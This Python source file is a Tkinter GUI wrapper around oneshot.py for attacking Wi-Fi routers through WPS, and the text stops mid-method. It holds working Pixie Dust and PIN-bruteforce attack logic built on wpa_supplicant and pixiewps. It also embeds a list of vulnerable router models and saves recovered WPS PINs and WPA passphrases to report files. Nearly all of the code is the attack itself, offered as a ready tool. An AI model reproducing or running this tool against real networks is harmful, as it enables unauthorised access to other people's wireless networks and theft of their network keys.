import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, font as tkFont
import threading
import time
import queue
import re
import pyperclip
import subprocess
import os
import glob
import csv
import sys
import shutil
import logging
from importlib import util as importlib_util
import webbrowser
import tempfile
import codecs
import socket
import pathlib
from datetime import datetime
import collections
import statistics
from pathlib import Path
from typing import Dict

# --- Global Constants ---
APP_VERSION = "1.3"

# --- Dependency Checking ---
def check_dependencies():
    """Checks for required pip packages and system commands, and attempts to install them."""
    # Check for pyperclip
    if not importlib_util.find_spec("pyperclip"):
        print("Pyperclip not found. Attempting to install...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip"])
            print("Pyperclip installed successfully.")
        except subprocess.CalledProcessError:
            messagebox.showerror("Dependency Error",
                                 "Failed to install 'pyperclip'.\n"
                                 "Please install it manually by running:\n\n"
                                 f"'{sys.executable} -m pip install pyperclip'")
            return False

    # Check for required system commands
    required_commands = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'iw', 'wpa_supplicant', 'pixiewps']
    missing_commands = [cmd for cmd in required_commands if not shutil.which(cmd)]
    if missing_commands:
        error_msg = f"The following required command(s) were not found: {', '.join(missing_commands)}\n\n"
        if 'airmon-ng' in missing_commands or 'airodump-ng' in missing_commands or 'aireplay-ng' in missing_commands:
            error_msg += "Please install the 'aircrack-ng' suite.\nOn Debian/Ubuntu/Kali: sudo apt install aircrack-ng\n\n"
        if 'iw' in missing_commands:
            error_msg += "Please install 'iw'.\nOn Debian/Ubuntu/Kali: sudo apt install iw\n\n"
        if 'wpa_supplicant' in missing_commands:
            error_msg += "Please install 'wpa_supplicant'.\nOn Debian/Ubuntu/Kali: sudo apt install wpasupplicant\n\n"
        if 'pixiewps' in missing_commands:
            error_msg += "Please install 'pixiewps'.\nOn Debian/Ubuntu/Kali: sudo apt install pixiewps\n\n"
        
        messagebox.showerror("Dependency Error", error_msg)
        return False
    
    return True

# --- Embedded Vulnerable WSC List (from oneshot.py) ---
VULNWSC_LIST_CONTENT = """
ADSL Router EV-2006-07-27
ADSL RT2860
AIR3G WSC Wireless Access Point AIR3G WSC Device
AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP
Archer_A9 1.0
ArcherC20i 1.0
Archer A2 5.0
Archer A5 4.0
Archer C2 1.0
Archer C2 3.0
Archer C5 4.0
Archer C6 3.20
Archer C6U 1.0.0
Archer C20 1.0
Archer C20 4.0
Archer C20 5.0
Archer C50 1.0
Archer C50 3.0
Archer C50 4.0
Archer C50 5.0
Archer C50 6.0
Archer MR200 1.0
Archer MR200 4.0
Archer MR400 4.2
Archer MR200 5.0
Archer VR300 1.20
Archer VR400 3.0
Archer VR2100 1.0
B-LINK 123456
Belkin AP EV-2012-09-01
DAP-1360 DAP-1360
DIR-635 B3
DIR-819 v1.0.1
DIR-842 DIR-842
DWR-921C3 WBR-0001
D-Link N Router GO-RT-N150
D-Link Router DIR-605L
D-Link Router DIR-615H1
D-Link Router DIR-655
D-Link Router DIR-809
D-Link Router GO-RT-N150
Edimax Edimax
EC120-F5 1.0
EC220-G5 2.0
EV-2009-02-06
Enhanced Wireless Router F6D4230-4 v1
Home Internet Center KEENETIC series
Home Internet Center Keenetic series
Huawei Wireless Access Point RT2860
JWNR2000v2(Wireless AP) JWNR2000v2
Keenetic Keenetic series
Linksys Wireless Access Point EA7500
Linksys Wireless Router WRT110
NBG-419N NBG-419N
Netgear AP EV-2012-08-04
NETGEAR Wireless Access Point NETGEAR
NETGEAR Wireless Access Point R6220
NETGEAR Wireless Access Point R6260
N/A EV-2010-09-20
Ralink Wireless Access Point RT2860
Ralink Wireless Access Point WR-AC1210
RTL8196E
RTL8xxx EV-2009-02-06
RTL8xxx EV-2010-09-20
RTL8xxx RTK_ECOS
RT-G32 1234
Sitecom Wireless Router 300N X2 300N
Smart Router R3 RT2860
Tenda 123456
Timo RA300R4 Timo RA300R4
TD-W8151N RT2860
TD-W8901N RT2860
TD-W8951ND RT2860
TD-W9960 1.0
TD-W9960 1.20
TD-W9960v 1.0
TD-W8968 2.0
TEW-731BR TEW-731BR
TL-MR100 1.0
TL-MR3020 3.0
TL-MR3420 5.0
TL-MR6400 3.0
TL-MR6400 4.0
TL-WA855RE 4.0
TL-WR840N 4.0
TL-WR840N 5.0
TL-WR840N 6.0
TL-WR841N 13.0
TL-WR841N 14.0
TL-WR841HP 5.0
TL-WR842N 5.0
TL-WR845N 3.0
TL-WR845N 4.0
TL-WR850N 1.0
TL-WR850N 2.0
TL-WR850N 3.0
TL-WR1042N EV-2010-09-20
Trendnet router TEW-625br
Trendnet router TEW-651br
VN020-F3 1.0
VMG3312-T20A RT2860
VMG8623-T50A RT2860
WAP300N WAP300N
WAP3205 WAP3205
Wi-Fi Protected Setup Router RT-AC1200G+
Wi-Fi Protected Setup Router RT-AX55
Wi-Fi Protected Setup Router RT-N10U
Wi-Fi Protected Setup Router RT-N12
Wi-Fi Protected Setup Router RT-N12D1
Wi-Fi Protected Setup Router RT-N12VP
Wireless Access Point .
Wireless Router 123456
Wireless Router RTL8xxx EV-2009-02-06
Wireless Router Wireless Router
Wireless WPS Router <#ZVMODELVZ#>
Wireless WPS Router RT-N10E
Wireless WPS Router RT-N10LX
Wireless WPS Router RT-N12E
Wireless WPS Router RT-N12LX
WN3000RP V3
WN-200R WN-200R
WPS Router (5G) RT-N65U
WPS Router DSL-AC51
WPS Router DSL-AC52U
WPS Router DSL-AC55U
WPS Router DSL-N14U-B1
WPS Router DSL-N16
WPS Router DSL-N17U
WPS Router RT-AC750
WPS Router RT-AC1200
WPS Router RT-AC1200_V2
WPS Router RT-AC1750
WPS Router RT-AC750L
WPS Router RT-AC1750U
WPS Router RT-AC51
WPS Router RT-AC51U
WPS Router RT-AC52U
WPS Router RT-AC52U_B1
WPS Router RT-AC53
WPS Router RT-AC57U
WPS Router RT-AC65P
WPS Router RT-AC85P
WPS Router RT-N11P
WPS Router RT-N12E
WPS Router RT-N12E_B1
WPS Router RT-N12 VP
WPS Router RT-N12+
WPS Router RT-N14U
WPS Router RT-N56U
WPS Router RT-N56UB1
WPS Router RT-N65U
WPS Router RT-N300
WR5570 2011-05-13
ZyXEL NBG-416N AP Router
ZyXEL NBG-416N AP Router NBG-416N
ZyXEL NBG-418N AP Router
ZyXEL NBG-418N AP Router NBG-418N
ZyXEL Wireless AP Router NBG-417N
"""

# --- Core Logic from oneshot.py ---

class GuiOutput:
    """A class to redirect stdout to the GUI console."""
    def __init__(self, console_widget):
        self.console_widget = console_widget
        self.original_stdout = sys.stdout

    def write(self, text):
        if self.console_widget and self.console_widget.winfo_exists():
            self.console_widget.configure(state='normal')
            self.console_widget.insert(tk.END, text)
            self.console_widget.see(tk.END)
            self.console_widget.configure(state='disabled')

    def flush(self):
        pass
    
    def redirect(self):
        sys.stdout = self
        
    def restore(self):
        sys.stdout = self.original_stdout

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr
    
    @property
    def integer(self):
        return self._int_repr

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac_hex = hex(mac).split('x')[-1].upper()
        mac_hex = mac_hex.zfill(12)
        return ':'.join(mac_hex[i:i+2] for i in range(0, 12, 2))

class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} " \
                   f"--e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}"
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd

class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.wps_pin = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()

class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        if not self.attempts_times: return
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) <= 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f'[*] {percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin)')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        if self.last_attempt_time:
            self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter >= self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()

def get_hex(line):
    try:
        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()
    except IndexError:
        return ''

class Companion:
    def __init__(self, interface, stop_event, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.stop_event = stop_event
        self.wpas = None
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.res_socket_file = f"{tempfile.gettempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        self.bruteforce = BruteforceStatus()
        self.reports_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports')
        
    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while not self.stop_event.is_set():
            ret = self.wpas.poll()
            if ret is not None:
                raise ValueError('wpa_supplicant returned an error.')
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendAndReceive(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    def __handle_wpas(self, pixiemode=False):
        if not self.wpas or not self.wpas.stdout: return False
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if self.print_debug:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f'[*] Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(f'[*] Received WPS Message M{n}')
                if n == 5: print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line: self.pixie_creds.e_nonce = get_hex(line)
            elif 'DH own Public Key' in line and 'hexdump' in line: self.pixie_creds.pkr = get_hex(line)
            elif 'DH peer Public Key' in line and 'hexdump' in line: self.pixie_creds.pke = get_hex(line)
            elif 'AuthKey' in line and 'hexdump' in line: self.pixie_creds.authkey = get_hex(line)
            elif 'E-Hash1' in line and 'hexdump' in line: self.pixie_creds.e_hash1 = get_hex(line)
            elif 'E-Hash2' in line and 'hexdump' in line: self.pixie_creds.e_hash2 = get_hex(line)
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif 'WPS-FAIL' in line:
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            if 'SSID' in line: self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[+] Authenticated')
        elif 'Trying to associate with' in line:
            if 'SSID' in line: self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with AP…')
        elif 'Associated with' in line and self.interface in line:
            bssid = line.split()[-1].upper()
            if self.connection_status.essid: print(f'[+] Associated with {bssid} (ESSID: {self.connection_status.essid})')
            else: print(f'[+] Associated with {bssid}')
        elif 'EAPOL: txStart' in line:
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')

        return True

    def __runPixiewps(self, pixieforce=False):
        print("[*] Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(pixieforce)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8', errors='replace')
        print(r.stdout)
        print(r.stderr)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    return line.split(':')[-1].strip()
        return False

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = os.path.join(self.reports_dir, 'stored')
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(f'{filename}.txt', 'a', encoding='utf-8') as file:
            file.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\nWPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        write_header = not os.path.isfile(f'{filename}.csv')
        with open(f'{filename}.csv', 'a', newline='', encoding='utf-8') as file:
            writer = csv.writer(file, delimiter=';')
            if write_header: writer.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            writer.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt and .csv')
    
    def __wps_connection(self, bssid, pin, pixiemode=False):
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.connection_status.wps_pin = pin # Set the current pin
        if self.wpas and self.wpas.stdout:
            try:
                os.set_blocking(self.wpas.stdout.fileno(), False)
                self.wpas.stdout.read()
                os.set_blocking(self.wpas.stdout.fileno(), True)
            except (TypeError, ValueError, BlockingIOError):
                pass
        
        print(f"[*] Trying PIN '{pin}'…")
        cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print('[!] wpa_supplicant command failed. Is it compiled with WPS support?')
            return

        while not self.stop_event.is_set():
            if not self.__handle_wpas(pixiemode): break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'): break
        
        self.sendAndReceive('WPS_CANCEL')

    def attack(self, bssid, pin=None, pixie=False, bruteforce=False, pixieforce=False):
        try:
            self.__init_wpa_supplicant()
            if bruteforce:
                self.smart_bruteforce(bssid, pin)
            else: # Pixie or Custom PIN
                # The initial pin for pixie is just to start the process
                initial_pin = pin if pin else '12345670'
                self.single_connection(bssid, initial_pin, pixie, pixieforce)
        except Exception as e:
            print(f"\n[!] An error occurred during the attack: {e}")
        finally:
            self.cleanup()
            
    def single_connection(self, bssid, pin, pixiemode, pixieforce):
        # This is the first connection attempt. For Pixie, it's to gather data. For Custom PIN, it's the actual attempt.
        self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            # This branch is hit if a Custom PIN works on the first try.
            self.__credentialPrint(self.connection_status.wps_pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result: self.__saveResult(bssid, self.connection_status.essid, self.connection_status.wps_pin, self.connection_status.wpa_psk)
        
        elif pixiemode and self.pixie_creds.got_all():
            # This branch is for Pixie Dust attack after gathering data.
            new_pin = self.__runPixiewps(pixieforce)
            if new_pin and not self.stop_event.is_set():
                print(f"\n[+] Pixie Dust found a potential PIN: {new_pin}\n")
                print("[*] Trying to connect with the found PIN...")
                # Now, attempt to connect with the new PIN.
                self.__wps_connection(bssid, new_pin, pixiemode=False) # pixiemode is False now
                if self.connection_status.status == 'GOT_PSK':
                    # Success!
                    self.__credentialPrint(new_pin, self.connection_status.wpa_psk, self.connection_status.essid)
                    if self.save_result: self.__saveResult(bssid, self.connection_status.essid, new_pin, self.connection_status.wpa_psk)
                else:
                    # The specific case the user is seeing.
                    print("\n[!] PIN was found, but the final connection failed.")
                    print("[i] The AP might be in a locked state or the PIN is incorrect.")
                    print("[i] Try connecting manually with the found PIN after a few minutes.")
                    self.__credentialPrint(new_pin, "N/A (Connection Failed)", self.connection_status.essid)
                    if self.save_result: self.__saveResult(bssid, self.connection_status.essid, new_pin, "N/A (Connection Failed)")
            else:
                print("[-] Pixie Dust attack failed to find a PIN. The AP may not be vulnerable.")
        
        else:
            # This branch is hit if a Custom PIN fails, or if Pixie fails to gather data.
            print("[-] Attack failed.")

    def smart_bruteforce(self, bssid, start_pin='0000'):
        mask = start_pin[:7] if start_pin else '0000'
        
        self.bruteforce.clear()
        self.bruteforce.mask = mask

        if len(mask) <= 4:
            f_half = self.__first_half_bruteforce(bssid, mask.zfill(4))
            if f_half and not self.stop_event.is_set():
                pin = self.__second_half_bruteforce(bssid, f_half, '000')
                if pin: self.connection_status.status = 'GOT_PSK' 
        elif len(mask) == 7:
            f_half, s_half = mask[:4], mask[4:]
            pin = self.__second_half_bruteforce(bssid, f_half, s_half)
            if pin: self.connection_status.status = 'GOT_PSK'

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(self.connection_status.wps_pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result: self.__saveResult(bssid, self.connection_status.essid, self.connection_status.wps_pin, self.connection_status.wpa_psk)
        else:
            print("[-] Bruteforce did not succeed or was stopped.")

    def __first_half_bruteforce(self, bssid, f_half):
        while int(f_half) < 10000 and not self.stop_event.is_set():
            t = int(f_half + '000')
            pin = f'{f_half}000{self.checksum(t)}'
            self.bruteforce.registerAttempt(f_half)
            self.__wps_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print(f'[+] First half found: {f_half}')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                continue # Retry same pin
            f_half = str(int(f_half) + 1).zfill(4)
        return False
    
    def __second_half_bruteforce(self, bssid, f_half, s_half):
        while int(s_half) < 1000 and not self.stop_event.is_set():
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{self.checksum(t)}'
            self.bruteforce.registerAttempt(f_half + s_half)
            self.__wps_connection(bssid, pin)
            if self.connection_status.last_m_message > 6 or self.connection_status.status == 'GOT_PSK':
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                continue # Retry same pin
            s_half = str(int(s_half) + 1).zfill(3)
        return False

    def checksum(self, pin):
        accum = 0
        pin = int(pin)
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10
        
    def __credentialPrint(self, wps_pin, wpa_psk, essid):
        print("\n" + "="*40)
        print(">>>>> CRACKED SUCCESSFULLY <<<<<")
        if essid: print(f"[+] AP SSID: '{essid}'")
        if wps_pin: print(f"[+] WPS PIN: '{wps_pin}'")
        if wpa_psk: print(f"[+] WPA PSK: '{wpa_psk}'")
        print("="*40 + "\n")
        self.connection_status.wps_pin = wps_pin
        self.connection_status.wpa_psk = wpa_psk
        
    def cleanup(self):
        if self.wpas:
            self.wpas.terminate()
            self.wpas.wait()
        self.retsock.close()
        if os.path.exists(self.res_socket_file):
            os.remove(self.res_socket_file)
        if os.path.exists(self.tempconf):
            os.remove(self.tempconf)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        print("[*] Cleanup complete.")

class WiFiScanner:
    def __init__(self, interface, vuln_list_content):
        self.interface = interface
        self.vuln_list = vuln_list_content.strip().splitlines()

    def get_band_from_freq(self, freq):
        try:
            freq_int = int(freq)
            if 2400 <= freq_int <= 2500: return "2.4GHz"
            elif 5100 <= freq_int <= 5900: return "5GHz"
            return "N/A"
        except (ValueError, TypeError):
            return "N/A"

    def iw_scanner(self):
        cmd = f'iw dev {self.interface} scan'
        try:
            proc = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True, errors='replace')
        except subprocess.CalledProcessError as e:
            print(f"[!] Scan command failed: {e.stderr}")
            return []
        
        lines = proc.stdout.splitlines()
        networks, current_network = [], None

        for line in lines:
            line = line.strip()
            bssid_match = re.match(r'BSS (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', line)
            if bssid_match:
                if current_network: networks.append(current_network)
                current_network = {'BSSID': bssid_match.group(1).upper(), 'WPS': False, 'Model': '', 'Model number': '', 'Device name': ''}
                continue

            if not current_network: continue
            
            if (essid_match := re.match(r'SSID: (.*)', line)): current_network['ESSID'] = essid_match.group(1)
            if (signal_match := re.match(r'signal: ([-\d\.]+)\s*dBm', line)): current_network['Signal'] = signal_match.group(1)
            if (freq_match := re.match(r'freq: (\d+)', line)): current_network['Band'] = self.get_band_from_freq(freq_match.group(1))
            if re.search(r'WPS:.*?Version: (\d\.\d)', line): current_network['WPS'] = True
            if (model_match := re.search(r'Model: (.*)', line)): current_network['Model'] = model_match.group(1)
            if (model_num_match := re.search(r'Model Number: (.*)', line)): current_network['Model number'] = model_num_match.group(1)
            if (device_name_match := re.search(r'Device name: (.*)', line)): current_network['Device name'] = device_name_match.group(1)

        if current_network: networks.append(current_network)
        
        wps_networks = [n for n in networks if n.get('WPS')]
        
        for n in wps_networks:
            n['FullDeviceName'] = n['Device name'] if n['Device name'] else f"{n['Model']} {n['Model number']}".strip()

        wps_networks.sort(key=lambda x: float(x.get('Signal', -100)), reverse=True)
        return wps_networks

# --- GUI Application Class for the Oneshot Tab ---
class OneshotTab:
    def __init__(self, parent_frame, main_style, main_app_instance):
        self.parent = parent_frame
        self.main_style = main_style
        self.main_app = main_app_instance
        
        self.create_widgets()
        
        self.auto_scan_active = False
        self.auto_scan_job = None
        self.attack_thread = None
        self.stop_attack_event = threading.Event()
        self.vuln_list = VULNWSC_LIST_CONTENT.strip().splitlines()

        self.gui_output = GuiOutput(self.output_console)
        self.gui_output.redirect()

        self.refresh_adapters()
        
    def create_widgets(self):
        # Apply styles from the main app
        RED_BUTTON, RED_BUTTON_ACTIVE = "#8b0000", "#a52a2a"
        self.main_style.configure("Stop.TButton", background=RED_BUTTON, foreground='white')
        self.main_style.map("Stop.TButton", background=[('active', RED_BUTTON_ACTIVE)])
        self.main_style.configure("Vulnerable.Treeview", foreground='#90EE90') # Custom tag style

        main_frame = ttk.Frame(self.parent, padding="10")
        main_frame.pack(expand=True, fill="both")
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(0, weight=1)

        left_panel = ttk.Frame(main_frame, width=600)
        left_panel.grid(row=0, column=0, sticky="ns", padx=(0, 10))
        left_panel.grid_propagate(False)

        right_panel = ttk.Frame(main_frame)
        right_panel.grid(row=0, column=1, sticky="nsew")
        right_panel.rowconfigure(1, weight=1)
        right_panel.columnconfigure(0, weight=1)

        # Left Panel
        iface_frame = ttk.LabelFrame(left_panel, text="Network Interface", padding="10")
        iface_frame.pack(fill="x", pady=(0, 10))
        self.adapter_var = tk.StringVar()
        self.adapter_combo = ttk.Combobox(iface_frame, textvariable=self.adapter_var, state="readonly")
        self.adapter_combo.pack(side="left", expand=True, fill="x", padx=(0, 5))
        self.adapter_combo.bind('<<ComboboxSelected>>', self.on_adapter_select_oneshot)
        refresh_btn = ttk.Button(iface_frame, text="Refresh", command=self.refresh_adapters)
        refresh_btn.pack(side="left", padx=(0, 5))
        self.scan_btn = ttk.Button(iface_frame, text="Start Auto Scan", command=self.toggle_auto_scan)
        self.scan_btn.pack(side="left")

        networks_frame = ttk.LabelFrame(left_panel, text="Available WPS Networks", padding="10")
        networks_frame.pack(expand=True, fill="both")
        cols = ("BSSID", "ESSID", "Signal", "Band", "Device Name")
        self.networks_tree = ttk.Treeview(networks_frame, columns=cols, show="headings", selectmode="browse")
        for col in cols: self.networks_tree.heading(col, text=col)
        self.networks_tree.column("BSSID", width=130, anchor="w"); self.networks_tree.column("ESSID", width=140, anchor="w")
        self.networks_tree.column("Signal", width=50, anchor="center"); self.networks_tree.column("Band", width=60, anchor="center")
        self.networks_tree.column("Device Name", width=150, anchor="w")
        self.networks_tree.tag_configure('vulnerable', foreground='#90EE90')

        tree_scroll = ttk.Scrollbar(networks_frame, orient="vertical", command=self.networks_tree.yview)
        self.networks_tree.configure(yscrollcommand=tree_scroll.set)
        self.networks_tree.pack(side="left", expand=True, fill="both")
        tree_scroll.pack(side="right", fill="y")
        self.networks_tree.bind("<<TreeviewSelect>>", self.on_network_select)

        # Right Panel
        attack_frame = ttk.LabelFrame(right_panel, text="Attack Controls", padding="10")
        attack_frame.grid(row=0, column=0, sticky="ew")
        
        ttk.Label(attack_frame, text="Target BSSID:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.bssid_var = tk.StringVar()
        ttk.Entry(attack_frame, textvariable=self.bssid_var).grid(row=0, column=1, sticky="ew", padx=5, pady=2)
        
        ttk.Label(attack_frame, text="Custom PIN (Opt):").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.pin_var = tk.StringVar()
        ttk.Entry(attack_frame, textvariable=self.pin_var).grid(row=1, column=1, sticky="ew", padx=5, pady=2)
        
        button_frame = ttk.Frame(attack_frame); button_frame.grid(row=2, column=0, columnspan=2, sticky="ew", pady=5)
        self.pixie_btn = ttk.Button(button_frame, text="Pixie Dust", command=lambda: self.start_attack("pixie")); self.pixie_btn.pack(side="left", expand=True, fill="x", padx=2)
        self.bruteforce_btn = ttk.Button(button_frame, text="Smart Bruteforce", command=lambda: self.start_attack("bruteforce")); self.bruteforce_btn.pack(side="left", expand=True, fill="x", padx=2)
        self.custom_pin_btn = ttk.Button(button_frame, text="Try Custom PIN", command=lambda: self.start_attack("custom_pin")); self.custom_pin_btn.pack(side="left", expand=True, fill="x", padx=2)
        self.stop_btn = ttk.Button(button_frame, text="Stop", style="Stop.TButton", command=self.stop_attack, state="disabled"); self.stop_btn.pack(side="left", expand=True, fill="x", padx=2)
        
        options_frame = ttk.Frame(attack_frame); options_frame.grid(row=3, column=0, columnspan=2, sticky="w", pady=2)
        self.save_creds_var = tk.BooleanVar(value=True); ttk.Checkbutton(options_frame, text="Save credentials", variable=self.save_creds_var).pack(side="left", padx=5)
        self.pixie_force_var = tk.BooleanVar(); ttk.Checkbutton(options_frame, text="Pixie --force", variable=self.pixie_force_var).pack(side="left", padx=5)
        attack_frame.columnconfigure(1, weight=1)

        console_frame = ttk.LabelFrame(right_panel, text="Output Console", padding="10")
        console_frame.grid(row=1, column=0, sticky="nsew", pady=(5,0))
        console_frame.rowconfigure(0, weight=1); console_frame.columnconfigure(0, weight=1)
        self.output_console = scrolledtext.ScrolledText(console_frame, wrap=tk.WORD, bg="#2d2d2d", fg="#e0e0e0", relief="flat", state='disabled')
        self.output_console.grid(row=0, column=0, sticky='nsew')
        ttk.Button(console_frame, text="Clear", command=lambda: self.clear_console()).grid(row=1, column=0, pady=5)

        cracked_frame = ttk.LabelFrame(right_panel, text="Cracked Credentials", padding="10")
        cracked_frame.grid(row=2, column=0, sticky="ew", pady=(5,0))
        ttk.Label(cracked_frame, text="WPS PIN:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.pin_result_var = tk.StringVar()
        ttk.Entry(cracked_frame, textvariable=self.pin_result_var, state="readonly").grid(row=0, column=1, sticky="ew", padx=5)
        ttk.Button(cracked_frame, text="Copy", width=8, command=lambda: self.copy_to_clipboard(self.pin_result_var.get())).grid(row=0, column=2, padx=(5,0))
        ttk.Label(cracked_frame, text="WPA PSK:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.psk_result_var = tk.StringVar()
        ttk.Entry(cracked_frame, textvariable=self.psk_result_var, state="readonly").grid(row=1, column=1, sticky="ew", padx=5)
        ttk.Button(cracked_frame, text="Copy", width=8, command=lambda: self.copy_to_clipboard(self.psk_result_var.get())).grid(row=1, column=2, padx=(5,0))
        cracked_frame.columnconfigure(1, weight=1)

    def on_adapter_select_oneshot(self, event):
        """Handle adapter selection specifically for the Oneshot tab."""
        adapter_name = self.adapter_var.get()
        # If a monitor interface from the main app exists and the user selects the base interface,
        # we can offer to use the existing monitor mode interface to save time.
        if self.main_app.monitor_interface and adapter_name in self.main_app.monitor_interface:
            if messagebox.askyesno("Use Active Monitor Interface?", 
                                   f"A monitor interface ('{self.main_app.monitor_interface}') is already active.\n"
                                   "Do you want to use it for the WPS attack?"):
                self.adapter_var.set(self.main_app.monitor_interface)

    def clear_console(self):
        self.output_console.configure(state='normal')
